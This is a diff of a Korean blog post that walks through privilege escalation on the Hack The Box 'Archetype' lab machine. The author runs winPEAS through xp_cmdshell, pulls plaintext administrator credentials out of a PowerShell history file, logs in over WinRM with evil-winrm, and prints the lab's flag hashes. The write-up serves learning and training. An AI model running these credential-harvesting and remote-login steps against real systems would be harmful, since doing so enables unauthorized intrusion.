@@ -374,12 +374,185 @@ ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
 > What script can be used in order to search possible paths to escalate privileges on Windows hosts?
 
 해당 파일은 [Github](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)에서 다운로드 가능하며, 나의 경우 bat 형태로 받아 이전의 File Transfer 과정을 거쳐 대상 서버에 다운로드하였다.
+
+
+
+
+powershell을 통해 실행하면 아래와 같이 나오며, 꽤 오래시간이 소요된다.
+``` bash
+PS C:\Users\Public> .\winpeas.ps1
+.\winpeas.ps1
+,/*,..*(((((((((((((((((((((((((((((((((,
+,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+((((((((((((((((* *****,,,\########## .(* ,((((((
+(((((((((((/*******************####### .(. ((((((
+(((((((/******************/@@@@@/***\#######\((((((
+,,..**********************/@@@@@@@@@/***,#####.\/(((((
+, ,**********************/@@@@@+@@@/*********##((/ /((((
+..(((##########*********/#@@@@@@@@@/*************,,..((((
+.(((################(/******/@@@@@/****************.. /((
+.((########################(/************************..*(
+.((#############################(/********************.,(
+.((##################################(/***************..(
+.((######################################(/***********..(
+.((######(,.***.,(###################(..***(/*********..(
+.((######*(####((###################((######/(********..(
+.((##################(/**********(################(**...(
+.(((####################/*******(###################.((((
+.(((((############################################/  /((
+..(((((#########################################(..(((((.
+....(((((#####################################( .((((((.
+......(((((#################################( .(((((((.
+(((((((((. ,(############################(../(((((((((.
+  (((((((((/,  ,####################(/..((((((((((.
+        (((((((((/,.  ,*//////*,. ./(((((((((((.
+           (((((((((((((((((((((((((((/
+          by CarlosPolop & RandolphConley
+ADVISORY: WinPEAS - Windows local Privilege Escalation Awesome Script
 ```
- Volume in d
 
+수집된 정보를 보던 중 꽤 익숙한 5985 port가 있다는 것을 확인했다.
+``` bash
+=========|| LISTENING PORTS
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       836
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1556
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+```
+
+nmap으로 확인해보니 wsman (winRM)이 동작하고 있는 것을 알 수 있다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# nmap -sCV -p 5985 10.129.95.187
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 23:05 EST
+Nmap scan report for 10.129.95.187
+Host is up (0.31s latency).
+
+PORT     STATE SERVICE VERSION
+5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
+
+┌──(root㉿kali)-[/home/user]
+└─# nmap -p 5985 10.129.95.187
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-22 23:05 EST
+Nmap scan report for 10.129.95.187
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE
+5985/tcp open  wsman
+```
+수집한 게정을 통해 evil-winrm을 실행해았지만, 실패했다. 생각해보니 아래 계정으로는 접속 해봤자. 이미 쉘을 장악한 상태이기에 무의미하다. 다시 권한 상승을 찾아보자
+
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# evil-winrm -i 10.129.95.187 -u sql_svc -p M3g4c0rp123
+
+Evil-WinRM shell v3.5
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
+Error: Exiting with code 1
+```
+
+로컬 파일을 찾아보던 중 아래와 같이 user.txt란 파일을 발견했고 해당 파일에는 user flag가 포함되어 있다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir c:\Users\sql_svc\Desktop
+output
+--------------------------------------------------
+ Volume in drive C has no label.
+ Volume Serial Number is 9565-0B4F
+ Directory of c:\Users\sql_svc\Desktop
+
+01/20/2020  05:42 AM    <DIR>          .
+01/20/2020  05:42 AM    <DIR>          ..
+02/25/2020  06:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  10,738,532,352 bytes free
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell type c:\Users\sql_svc\Desktop\user.txt
+output
+--------------------------------
+3e7b102e78218e935bf3f4951fec21a3
+```
+
+winPEAS.ps1의 결과를 보던 중 아래의 내용이 발견되었다.
+``` bash
+=========|| PowerShell History (Password Search Only)
+=|| PowerShell Console History
+=|| To see all history, run this command: Get-Content (Get-PSReadlineOption).HistorySavePath
+
+=|| AppData PSReadline Console History
+=|| To see all history, run this command: Get-Content C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+=|| PowesRhell default transrcipt history check
+```
+해당 파일을 출력해보면 administrator의 계정정보를 획득할 수 있다. 보아하니 smb 관련하여 관리자 계정으로 접근했던 이력이 파일에 남은 듯 하다.
+```
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+output
+-----------------------------------------------------------------------
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+```
+
+레지스트리 수집 결과가 너무 오래 걸려 중단했지만, winPEAS의 중간 수집 결과 중 아래의 내용도 확인할 수 있었다. 괜히 오래 기다렸나싶다.
+``` bash
+Possible Password found: Usernames2
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Usernames2 triggered
+> net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
 ```
 
 
+획득한 계정 정보를 통해 runas로 사용자를 변경하려 했으나, 이상하게 패스워드 입력 받는 부분에서 입력을 제대로 받지 않고 무시된다...도저히 패스워드를 입력할 수가없다. 또 runas는 pw를 인자로 안받기에 문제다.
+``` bash
+PS C:\Windows\system32> runas /user:administrator "cmd.exe"
+runas /user:administrator "cmd.exe"
+Enter the password for administrator:
+PS C:\Windows\system32> 
+```
+
+### login administorator
+하지만 이전의 삽집을 통해 winRM이 동작하고 있음을 알 수 있다. evil-winrm을 사용하여 로그인해보았다.ㅡㅡㅡㅡgood! 드디어 관리자 계정으로 로그인에 성공했다.
+> 패스워드에 역슬래쉬를 넣은 이유는 리눅스에서 "!"를 history로 인식하기에 이스케이프 해주어야 한다. 안그럼 자꾸 명령줄에 다른 문구가 자동으로 붙어진다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# evil-winrm -i 10.129.95.187 -u administrator -p MEGACORP_4dm1n\!\!
+
+Evil-WinRM shell v3.5
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+archetype\administrator
+```
+
+
+``` bash
+*Evil-WinRM* PS C:\Users\Administrator> dir Desktop
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        2/25/2020   6:36 AM             32 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
+b91ccec3305e98240082d4474b848528
+```
+드디어 풀었다....이번 문제는 푸는데 정말 오래걸렸다...winpeas의 모든 결과를 기다려야 하는 줄 알고 시간을 오래 할애하였음에도 자꾸 문제로 받은 머신이 종료되어 풀 수가 없었다. 그냥 중간에 진작 결과를 볼걸..
+![](../assets/image_post/20240223133152.png)
+
+
+### 참고
+아래는 winpeas.ps1의 실행 결과를 별도 파일로 저장하여 추출해내려고 할 때 사용하려던 방식이다. smb가 활성화되어 있으므로, 아래와 같이 backups의 실제 경로를 파악 후 해당 경로에 수집된 결과를 업로드해놓으면 추출이 용이하다.
 ``` bash
 SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell net share
 output
@@ -403,4 +576,3 @@ output
 01/20/2020  04:20 AM    <DIR>          ..
 01/20/2020  04:23 AM               609 prod.dtsConfig
 ```
-
